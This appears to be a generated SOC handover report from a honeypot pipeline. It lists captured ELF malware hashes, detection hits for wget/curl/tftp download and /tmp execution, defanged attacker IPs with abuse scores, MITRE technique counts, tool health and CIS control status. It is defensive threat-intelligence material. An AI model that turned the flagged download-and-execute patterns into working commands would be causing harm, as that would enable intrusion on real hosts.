| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `222.75.225[.]206` | CN | CHINANET ningxia province network | **100** ⚠️ | 50 |
| `36.92.35[.]211` | ID | PT Telekomunikasi Indonesia | **100** ⚠️ | 50 |
| `46.101.9[.]55` | GB | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `69.126.144[.]30` | US | Optimum Online (Cablevision Systems) | **100** ⚠️ | 50 |
| `103.120.116[.]162` | PK | Broadband Business Ideas (PVT.) Limited | **100** ⚠️ | 50 |
| `45.198.224[.]26` | NL | VPSVAULT.HOST LTD | **100** ⚠️ | 50 |
| `45.33.12[.]214` | US | Linode | **100** ⚠️ | 50 |
| `123.118.1[.]169` | CN | China Unicom Beijing province network | **100** ⚠️ | 0 |
| `192.72.56[.]178` | TW | Seednet-TaipeiDP-S | **100** ⚠️ | 29 |
| `107.135.117[.]245` | US | Private Customer - AT&T Internet Services | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 83 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 75 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 2 |

---

## 🔕 False Positive Summary (20 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 16 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 814 cases |
| Tool 34  | Credential Extractor        | ✅ 98 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 82 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 20 filtered (2.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 56 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 75 priority case(s) shown individually · 29 recon entry/entries in table (13 group(s) consolidating 703 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-19T10:34:24Z_
